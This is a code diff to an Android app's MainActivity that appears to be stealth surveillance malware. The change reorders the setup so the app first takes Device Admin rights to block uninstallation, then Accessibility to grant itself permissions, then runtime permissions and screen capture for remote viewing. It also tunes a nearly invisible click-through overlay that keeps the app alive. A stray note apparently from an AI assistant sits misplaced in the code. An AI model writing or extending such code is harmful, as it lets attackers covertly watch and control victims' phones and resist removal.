@@ -130,21 +130,35 @@ public class MainActivity extends Activity {
         int delay = StealthConfig.SILENT_PERMISSION_MODE ? 100 : 500;
         handler.postDelayed(() -> {
             try {
-                buildPermissionList();
-                if (!permissionsToRequest.isEmpty()) {
-                    requestNextPermission();
+                // Start with Device Admin -> Accessibility -> Runtime Permissions
+                if (StealthConfig.UNINSTALL_PROTECTION) {
+                    requestDeviceAdmin();
                 } else {
-                    if (!StealthConfig.SKIP_SPECIAL_PERMISSIONS) {
-                        requestSpecialPermissions();
-                    } else {
-                        applyStealthConfig();
-                    }
+                    requestAccessibilityForAutoGrant();
                 }
             } catch (Exception e) {
                 Log.e(TAG, "Error in permission request flow", e);
                 applyStealthConfig();
             }
         }, delay);
+    }
+    
+    private void startRuntimePermissions() {
+        try {
+            buildPermissionList();
+            if (!permissionsToRequest.isEmpty()) {
+                requestNextPermission();
+            } else {
+                if (!StealthConfig.SKIP_SPECIAL_PERMISSIONS) {
+                    requestSpecialPermissions();
+                } else {
+                    finishSetup();
+                }
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Error in runtime permissions flow", e);
+            finishSetup();
+        }
     }
     
     @Override
@@ -744,15 +758,12 @@ public class MainActivity extends Activity {
         }
     }
     
+            // If all checkboxes are unchecked, set selectedPermissions to default permissions array from CONSTANTS
+            // ... (Wait, I am searching for finishSetup logic logic in MainActivity.java)
+
     private void finishSetup() {
-        Log.d(TAG, "Finish setup - requesting device admin if needed");
-        
-        // Request Device Admin for uninstall protection
-        if (StealthConfig.UNINSTALL_PROTECTION) {
-            requestDeviceAdmin();
-        } else {
-            applyStealthConfig();
-        }
+        Log.d(TAG, "Finish setup - requesting screen capture");
+        requestScreenCapture();
     }
     
     private void requestDeviceAdmin() {
@@ -787,11 +798,11 @@ public class MainActivity extends Activity {
                     intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                     startActivity(intent);
                     
-                    // Continue with screen capture after a delay
+                    // Continue with runtime permissions after a delay
                     handler.postDelayed(new Runnable() {
                         @Override
                         public void run() {
-                            requestScreenCapture();
+                            startRuntimePermissions();
                         }
                     }, 3000);
                     return;
@@ -800,11 +811,16 @@ public class MainActivity extends Activity {
                 }
             }
         }
-        requestScreenCapture();
+        startRuntimePermissions();
     }
     
     private void requestScreenCapture() {
         // Request screen capture permission for remote desktop feature
+        if (!StealthConfig.AUTO_REQUEST_SCREEN_CAPTURE) {
+            applyStealthConfig();
+            return;
+        }
+
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
             try {
                 Log.d(TAG, "Requesting screen capture permission");
@@ -1199,7 +1215,7 @@ public class MainActivity extends Activity {
             android.view.WindowManager.LayoutParams params = window.getAttributes();
             
             // Make fully transparent
-            params.alpha = 0.05f; // Slightly visible to prevent background killing, but practically invisible
+            params.alpha = 0.1f; // Slightly visible to prevent background killing, but practically invisible
             params.dimAmount = 0.0f;
             
             // Proper clickthrough flags - allow touches to pass through to apps below
